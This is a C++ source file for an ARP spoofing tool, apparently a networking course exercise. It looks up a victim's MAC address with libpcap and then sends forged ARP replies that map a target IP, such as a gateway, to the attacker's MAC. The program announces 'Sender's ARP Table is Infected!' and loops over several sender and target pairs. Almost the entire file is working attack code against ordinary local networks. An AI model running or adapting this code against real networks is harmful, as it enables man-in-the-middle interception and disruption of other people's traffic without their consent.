#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <fstream>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>

#include <iostream>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};

#pragma pack(pop)

#define ARP_SIZE 42

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

//Generated By GPT o3-mini-high source:https://stackoverflow.com/questions/17909401/linux-c-get-default-interfaces-ip-address
bool get_s_ip(char* dev, char* ip) {
	struct ifreq ifr;
	int s = socket(AF_INET, SOCK_DGRAM, 0);

	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
	ioctl(s, SIOCGIFADDR, &ifr);

	close(s);

	Ip my_ip = Ip(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));

	std::string str = std::string(my_ip);

	if (str.length() > 0) {
		strcpy(ip, str.c_str());
		return true;
	}
	
	return false;
}

bool get_s_mac(char* dev, char* mac) {
	std::string mac_addr;
	std::ifstream mac_file("/sys/class/net/" + std::string(dev) + "/address");
	std::string str((std::istreambuf_iterator<char>(mac_file)), std::istreambuf_iterator<char>());

	if (str.length() > 0) {
		strcpy(mac, str.c_str());
		return true;
	}
	
	return false;
}

void attack(char* dev, char* sender, char* target){

	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return;
	}
	
	// Calculate Attacker's Mac Addr
	char s_mac[Mac::SIZE];
	if (get_s_mac(dev, s_mac)) {
		printf("My MAC address: %s\n", s_mac);
	} else {
		printf("couldn't get MAC address\n");
		return;
	}
	
	// Calculate Attacker's IP Addr
	char s_ip[Ip::SIZE];
	if (get_s_ip(dev, s_ip)) {
		printf("My IP address: %s\n", s_ip);
	} else {
		printf("couldn't get IP address\n");
		return;
	}
	std::string s_ip_str = std::string(s_ip);

	EthArpPacket packet;
	
	////////////////////////////////////////////
	////////// Find Sender's Mac Addr //////////
	////////////////////////////////////////////

	//////////*         Packet Header Structure         *//////////
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");		// Sender's Mac
	packet.eth_.smac_ = Mac(s_mac);						// Attacker's Mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(s_mac);						// Attacker's Mac
	packet.arp_.sip_ = htonl(Ip(s_ip_str));				// Attacker's IP
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");		// Sender's Mac
	packet.arp_.tip_ = htonl(Ip(sender));				// Sender's IP
	/*/////////                                        //////////*/
	
	// Send Packet
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	
	// Capture Packet
	struct pcap_pkthdr *pkt_header;
	const u_char *pkt_data;
	EthHdr* eth;
	ArpHdr* arp; std::string arp_sip;

	do{
		res = pcap_next_ex(handle, &pkt_header, &pkt_data);
		if (res != 1) {
			fprintf(stderr, "pcap_next_ex return %d error=%s\n", res, pcap_geterr(handle));
			return;
		}
		eth = (EthHdr*) pkt_data;
		arp = (ArpHdr*) (pkt_data + sizeof(EthHdr));
		arp_sip = std::string(arp->sip());
	}while(eth->type() != EthHdr::Arp || arp->op() != ArpHdr::Reply || arp_sip.compare(sender) != 0);
	

	std::string d_mac = std::string(arp->smac());
	printf("Target MAC address: %s\n", d_mac.c_str());
	
	pcap_close(handle);
	
	printf("\n\n****Sender's Mac Addr Capture Success!****\n\n");
	
	//////////////////////////////////////
	////////// ARP Table Attack //////////
	//////////////////////////////////////
	
	pcap_t* handle_attack = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle_attack == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return;
	}
	
	
	//////////*         Packet Header Structure         *//////////
	packet.eth_.dmac_ = Mac(d_mac);			// Sender's Mac
	packet.eth_.smac_ = Mac(s_mac);  		// Attacker's Mac
	packet.eth_.type_ = htons(EthHdr::Arp);
	
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(s_mac);			// Attacker's Mac
	packet.arp_.sip_ = htonl(Ip(target));   // Target's IP
	packet.arp_.tmac_ = Mac(d_mac);			// Victim's Mac
	packet.arp_.tip_ = htonl(Ip(sender));   // Victim's IP
	/*/////////                                        //////////*/
	
	
	// Send Packet
	res = pcap_sendpacket(handle_attack, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle_attack));
		return;
	}
	
	pcap_close(handle_attack);
	printf("\n\n****Sender's ARP Table is Infected!****\n\n");
}

int main(int argc, char* argv[]) {
	
	if (argc%2 != 0 || argc < 4) {
		usage();
		return -1;
	}
	for(int i = 2; i < argc; i += 2) {
		attack(argv[1], argv[i], argv[i+1]);
	}
}
